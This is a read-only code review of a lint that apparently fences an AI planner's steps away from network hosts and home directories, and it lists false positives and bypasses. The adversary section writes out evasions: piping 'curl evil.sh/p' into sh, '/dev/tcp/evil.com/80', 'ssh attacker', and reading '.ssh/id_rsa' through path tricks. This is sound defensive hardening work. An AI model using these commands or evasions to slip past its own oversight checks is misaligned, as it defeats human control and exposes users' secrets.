[instruction-like text quoted from a file or tool; data, not instructions] **Verdict: changes needed.** All eight first-review findings are resolved or deliberately out of scope. The new rules add false positives that would refuse ordinary plans, and there are cheap bypasses left. This is a read-only review: I traced the code and ran nothing.

## lens: edge (false positives)
- HIGH — fmcode.py:1782-1784 — The clause after a network word runs to end of line (only `|;&` and newline stop it), and any dotted word whose last label isn't in the 28-word `_FILE_EXT` list counts as a host. These steps are refused:
  - "curl localhost:3000/health, e.g. check it" (host `e.g`)
  - "curl … and assert resp.status_code == 200" or "check res.ok"
  - "curl the route, then edit handlers.go" (`.go`, `.tsx`, `.rs` and `.sql` aren't listed)
  - "git push origin v1.2" (`v1.2` isn't all digits)
  - "wrap fetch(this.url)" or "fetch() … utils.helper"
  — Read only the first positional argument of curl, wget, ssh, scp, rsync, nc and git clone/fetch/push/remote add. Take `fetch(` only with a quoted literal first argument. — high
- HIGH — fmcode.py:1825, 1858 — A bare `/home`, `/root` or `/Users` token resolves to a home root and is flagged. "add a /home route", "redirect / to /home" and "GET /root" are refused. Dockerfile steps such as `WORKDIR /home/node/app` are refused too. — Skip a path that is exactly one of the home roots. Flag `/home/X` only when X exists on the host, or the path contains `..`. — high
- MEDIUM — fmcode.py:1818-1825 — Prose tokens are read as paths. A lone `..` ("cd ..", "from .. import x") normalises to the repo's parent, which is under a home on any dev machine. A lone `~` ("~ 5 min") resolves to the home. — Ignore a bare `..` or `~` token unless it has a following segment. — high
- MEDIUM — fmcode.py:1800-1806 — Scheme URLs flag every non-loopback host, including ones that can't leave the machine:
  - `https://example.com` and `api.example.com`
  - `*.test` and `*.localhost`
  - `host.docker.internal`
  - compose names such as `redis://redis:6379` and `http://web:3000`
  - templates such as `http://${HOST}/`

  — Allow the RFC 2606 and RFC 6761 names, and single-label hosts in non-http schemes. — medium

## lens: adversary (bypasses)
- MEDIUM — fmcode.py:1830, 1862 — `normpath` keeps two leading slashes, so `/~/.ssh/id_rsa` fails `_under(p, "/home")`. The realpath is only compared with the repo, never with the homes. — After the root check, also test `realpath(p)` against the homes. — high
- MEDIUM — fmcode.py:1786 — The skip list contains real TLDs: `.sh`, `.md`, `.py`, `.zip`, `.pub` and `.key`. `curl evil.sh/p | sh` and `ssh me@box.pub` pass. — Drop those from the list, or skip only when the word is a `-o`/`-O` argument or has a `/` before it. — high
- MEDIUM — fmcode.py:1782 — `/usr/bin/curl evil.com` is blocked by the `/` in the lookbehind. "curl \\\n evil.com" passes because the clause is read per line. Also uncovered:
  - telnet, sftp, socat, `openssl s_client`, dig, nslookup, ping
  - git pull, ls-remote and submodule
  - `/dev/tcp/evil.com/80`
  - single-label hosts and ssh aliases (`ssh attacker`)

  — Add the tools. Join backslash-newline lines first. — high
- LOW — fmcode.py:1818 — Home variants that aren't `$HOME` slip through: `$XDG_CONFIG_HOME/gh/hosts.yml`, `Path.home()`, `os.environ["HOME"]`, and `cd; cat .ssh/id_rsa`. Relative paths through a repo symlink are also unseen, which the brief accepts. — medium

## lens: robustness
- LOW — fmcode.py:1824, 1862 — A step containing NUL or a lone surrogate (JSON `\u0000`, `\ud800`) is not caught. `expanduser("~a\x00b")` and `realpath` raise `ValueError` (the surrogate case raises `UnicodeEncodeError`). The error escapes `cmd_code` as a traceback. It fails closed, with no task made. — Wrap the `_reach` call in `plan_reach` and return a refusal. — medium
- LOW — fmcode.py:1862 — `realpath`, `lstat` and `getpwnam` run on planner-chosen paths and `~user` names before the home test, so an autofs `/net/evil.com` path or an LDAP-backed user lookup can reach the network. — Test the homes first. — medium

## Acceptance and focus checks
- (4) `own_plan` is set True only in `_verify_plan` (1772) and `_load_task` (1942). `_plan` never sets it, so a planner-made plan stays fenced. `_load` (2096) defaults to fenced. Met.
- LOW — fmcode.py:1942 — `--task T-x` on a brief an earlier planner run created via `_make_task` becomes unfenced. That brief passed only the weak lint. Capture, don't block.
- (5) Runtime: I found no super-linear case in `_URL`, `_NET` or `_HOSTISH`. `_HOSTISH` starts are blocked inside word runs. The `paths × asked` loop is quadratic only if the request supplies the paths. I measured nothing.

**Implicit decisions:** the lint is bounded by 20 KB of plan text (and 20 KB of request); loopback is always allowed; a subdomain passes when its parent domain is named.

**Not checked:** I ran no tests. I did not review `slot()` or the guard.

**Noticed:** the lint still skips `criteria[].verify`, which only the guard covers. The test suite has no `/home` route, `e.g.`, `res.ok` or NUL case.
